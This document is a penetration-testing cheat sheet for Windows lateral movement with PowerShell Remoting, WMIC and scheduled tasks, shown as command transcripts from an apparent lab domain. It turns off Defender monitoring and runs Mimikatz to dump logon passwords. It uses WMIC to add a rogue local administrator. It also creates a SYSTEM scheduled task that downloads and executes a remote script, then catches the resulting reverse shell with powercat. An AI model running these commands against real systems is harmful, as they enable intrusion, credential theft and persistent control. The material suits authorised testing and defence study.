
========================================================================================================================
Lateral movement using native commands (WMIC, PowerShell Remoting, Schtasks, RDP) 
========================================================================================================================

Requirement: 
> You need valid admin credentials on the remote Windows server or workstation

Index
======
1. Powershell Remoting
2. WMIC
3. Scheduled task (native command 'schtasks') + Powershell reverse shell
4. RDP


========================================================================================================================
Example 1 - Powershell Remoting
========================================================================================================================

1. Interactive PowerShell remote console using kerberos authentication (current session)
--------------------------------------------------------------------------------------------

PS C:\Users\pentester> hostname
Laptop1

PS C:\Users\pentester> whoami
security-lab\pentester

PS C:\Users\pentester> Enter-PSSession -Computername TEMP-DC.Security-Test-Lab.Local

[TEMP-DC.Security-Test-Lab.Local]: PS C:\Users\pentester\Documents> hostname
TEMP-DC

[TEMP-DC.Security-Test-Lab.Local]: PS C:\Users\pentester\Documents> whoami
security-lab\pentester

[TEMP-DC.Security-Test-Lab.Local]: PS C:\Users\pentester\Documents> exit


2. Interactive PowerShell remote console using credentials
----------------------------------------------------------

PS C:\Users\pentester> hostname
Laptop1

PS C:\Users\pentester> whoami
security-lab\pentester

PS C:\Users\pentester> Enter-PSSession -Computername TEMP-DC.Security-Test-Lab.Local -Credential security-lab\auditor

[TEMP-DC.Security-Test-Lab.Local]: PS C:\Users\auditor\Documents> hostname
TEMP-DC

PS C:\Users\pentester> whoami
security-lab\auditor

[TEMP-DC.Security-Test-Lab.Local]: PS C:\Users\auditor\Documents> dir
Volume in drive C has no label.
Volume Serial Number is C022-C9A0
Directory of C:\
<SNIP>

[TEMP-DC.Security-Test-Lab.Local]: PS C:\Users\auditor\Documents> exit


3. Non-Interactive PowerShell remote OS command execution
---------------------------------------------------------

PS C:\AD\jfc-tools\x64> Invoke-Command -ScriptBlock{hostname;whoami} -computername TEMP-DC -Credential security-lab\auditor
TEMP-DC
security-lab\auditor

PS C:\AD\jfc-tools\x64> Invoke-Command -ScriptBlock{hostname;whoami} -computername TEMP-DC
TEMP-DC
security-lab\pentester

Notes 
------
> 'Invoke-command' can also be used to execute a script or a command on multiple Windows servers

PS C:\AD\jfc-tools\x64> Invoke-command -Filepath C:\AD\Tools\evil.ps1 -ComputerName (get-content c:\path\list-servers.txt) -Credential security-lab\pentester
or
PS C:\AD\jfc-tools\x64> Invoke-command -Scriptblock {qwinsta} -ComputerName (get-content c:\path\list-servers.txt) -Credential security-lab\pentester

> Other example:

enter-pssession $session1
Set-MpPreference -DisableRealtimeMonitoring $true
exit
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $session1
enter-pssession $session1
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'


========================================================================================================================
Example 2 -  WMIC native commands
========================================================================================================================

Wmic /node:COMPUTER/user:DOMAIN\USER /password:PASSWORD process call create “COMMAND“


C:\> wmic /node:"192.168.13.215" /user:".\administrator" /password:"Test1******" /privileges:ENABLE process call create "cmd.exe /c (echo net user auditor SuP@P@ssW0rd /add > C:\users\administrator\test.bat)"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 340;
        ReturnValue = 0;
};


C:\> wmic /node:"192.168.13.215" /user:".\administrator" /password:"Test1******!" /privileges:ENABLE process call create "cmd.exe /c (echo net localgroup Administrators auditor /add >> C:\users\administrator\test.bat)"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 2412;
        ReturnValue = 0;
};


C:\> wmic /node:"192.168.13.215" /user:".\administrator" /password:"Test1******!" /privileges:ENABLE process call create "cmd.exe /c (C:\users\administrator\test.bat)"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 732;
        ReturnValue = 0;
};


=> On the remote Windows server '192.168.13.215', the 'auditor' account has been created and added to the local admin group:

C:\users\administrators> net user

User accounts for \\Test-server
-------------------------------------------------------------------------------
Administrator            DefaultAccount	     Guest
auditor

The command completed successfully.


C:\users\administrators> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
auditor
The command completed successfully.


========================================================================================================================
Example 3 - Create remotely a scheduled task (command schtasks) + Powershell reverse shell (InvokePowerShellTcp.ps1)
========================================================================================================================

schtasks /create /sc <ScheduleType> /tn <TaskName> /tr <TaskRun> [/s <Computer> [/u [<Domain>\]<User> [/p <Password>]]] [/ru {[<Domain>\]<User> | System}] [/rp <Password>] [/mo <Modifier>] [/d <Day>[,<Day>...] | *] [/m <Month>[,<Month>...]] [/i <IdleTime>] [/st <StartTime>] [/ri <Interval>] [{/et <EndTime> | /du <Duration>} [/k]] [/sd <StartDate>] [/ed <EndDate>] [/it] [/z] [/f]
/sc <ScheduleType>               : Specifies the schedule type. Valid values are MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE.
/tn <TaskName>                   : Specifies a name for the task.
/tr <TaskRun>                    : Specifies the program or command that the task runs. Type the fully qualified path and file name of an executable file, script file, or batch file. If you omit the path, schtasks assumes that the file is in the SystemRoot\System32 directory.
/s <Computer>                    : Schedules a task on the specified remote computer. Type the name or IP address of a remote computer (with or without backslashes). The default is the local computer.
/u [<Domain>\]<User>             : Runs this command with the permissions of the specified user account. The default is the permissions of the current user of the local computer.
/p <Password>                    : Provides the password for the user account specified in the /u parameter. If you use the /u parameter, but omit the /p parameter or the password argument, schtasks prompts you for a password and obscures the text you type
/ru {[<Domain>\]<User> | System} : Runs the task with permissions of the specified user account. By default, the task runs with the permissions of the current user of the local computer, or with the permission of the user specified by the /u parameter, if one is included. The /ru parameter is valid when scheduling tasks on local or remote computers.
/rp <Password>                   : Provides the password for the user account that is specified in the /ru parameter. If you omit this parameter when specifying a user account, SchTasks.exe prompts you for the password and obscures the text you type. Do not use the /rp parameter for tasks run with System account credentials (/ru System). The System account does not have a password and SchTasks.exe does not prompt for one.


C:\AD\jfc-tools\x64>schtasks /create /S win-server01.security-Test-Lab.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "testuser" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://X.X.X.X/InvokePowerShellTcp2.ps1''')'"
SUCCESS: The scheduled task "testuser" has successfully been created.

C:\AD\jfc-tools\x64>schtasks /Run /S win-server01.security-Test-Lab.local /TN "testuser"
SUCCESS: Attempted to run the scheduled task "testuser".


Other: schtasks /query /S win-server01.security-Test-Lab.local

-----------------------

C:\AD\jfc-tools>python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
172.16.1.1 - - [02/Sep/2020 11:40:37] code 404, message File not found
172.16.1.1 - - [02/Sep/2020 11:40:37] "GET /InvokePowerShellTcp2.ps1 HTTP/1.1" 404 -
172.16.1.1 - - [02/Sep/2020 11:41:42] "GET /InvokePowerShellTcp2.ps1 HTTP/1.1" 200 -

-----------------------

C:\Windows\system32>powershell -nop -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\AD\jfc-tools\
PS C:\AD\jfc-tools> . .\powercat.ps1
PS C:\AD\jfc-tools> .\powercat.ps1 -l -p 443 -v -t 1000
PS C:\AD\jfc-tools> powercat -l -p 443 -v -t 1000
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [X.X.X.X] port  [tcp] accepted (source port 51843)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
Windows PowerShell running as user Win-Server01$ on win-server01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>hostname
win-server01

PS C:\Windows\system32> whoami
nt authority\system
